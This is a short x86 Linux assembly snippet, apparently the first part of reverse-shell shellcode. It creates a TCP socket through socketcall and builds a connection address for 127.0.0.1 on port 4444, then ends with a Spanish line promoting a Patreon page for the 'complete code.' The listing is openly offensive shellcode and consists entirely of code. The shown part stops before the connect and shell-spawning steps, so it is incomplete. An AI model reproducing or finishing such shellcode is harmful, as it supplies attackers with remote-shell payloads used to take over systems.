global _start

section .text

_start:

xor esi, esi

mov al, 0x66
inc esi
push esi
pop ebx

xor esi, esi
push esi
inc esi
push esi
inc esi
push esi

mov ecx, esp

xor esi, esi
push esi
pop edx

int 0x80

xchg edx, eax

mov al, 0x66

push 0x0100007f
push word 0x5c11
push word 0x2

mov ecx, esp

Código completo.
https://www.patreon.com/BGPavelAng
Ayudame a seguir haciendo más de esto.

